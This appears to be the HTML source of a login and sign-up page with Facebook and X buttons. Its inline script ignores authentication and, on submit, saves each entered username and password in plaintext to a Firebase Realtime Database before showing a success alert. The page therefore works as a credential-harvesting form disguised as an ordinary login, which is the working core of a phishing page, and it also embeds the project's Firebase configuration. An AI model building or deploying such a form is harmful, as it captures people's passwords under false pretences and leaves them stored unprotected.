<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Login or Sign Up </title>
  <link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Open+Sans:400,300'><link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div id="login">

  <h1><strong>Welcome.</strong> Please login or Create an account.</h1>

  <form id="userForm" action="#" method="get">

    <fieldset>

      <p><input id="email"type="text" required  placeholder="Username"></p>

      <p><input id="password"type="password" required placeholder="Password"></p>

      <p id="forg"><a href="#">Forgot Password?</a></p>

      <p><input type="submit" value="Login"></p>

    </fieldset>

  </form>

  <p><span class="btn-round">or</span></p>
<p>Dont have an account, Sign up here</p>
  <p>

    <a class="facebook-before"> <img id="logo" src="images.jpeg" alt="images.jpeg"></img><span class="fontawesome-facebook"></span></a>
   
    <button id="facebook" class="facebook">Sign Up Using Facbook</button>

  </p>

  <p>

    <a class="twitter-before"><span class="fontawesome-twitter"></span></a>
    <button class="twitter" onclick="change()">Sign Up Using X</button>

  </p>

</div>
<script src="main.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAWUHv7SA7GrhstueJTocnKYHG9_sc-khE",
      authDomain: "bestweb-aaaa.firebaseapp.com",
      databaseURL: "https://bestweb-aaaa-default-rtdb.firebaseio.com", // Realtime Database URL
      projectId: "bestweb-aaaa",
      storageBucket: "bestweb-aaaa.appspot.com",
      messagingSenderId: "33549663960",
      appId: "1:33549663960:web:7fd5162d53b3cd9715e1ad",
      measurementId: "G-CEX3L71WXX"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database(app);

    document.getElementById('userForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;

      database.ref('users/' + email.replace('.', '_')).set({
        email: email,
        password: password
      }).then(function() {
        alert('Data successfully written to Firebase!');
      }).catch(function(error) {
        console.error('Error writing data to Firebase: ', error);
      });
    });
</script>
  
</body>
</html>
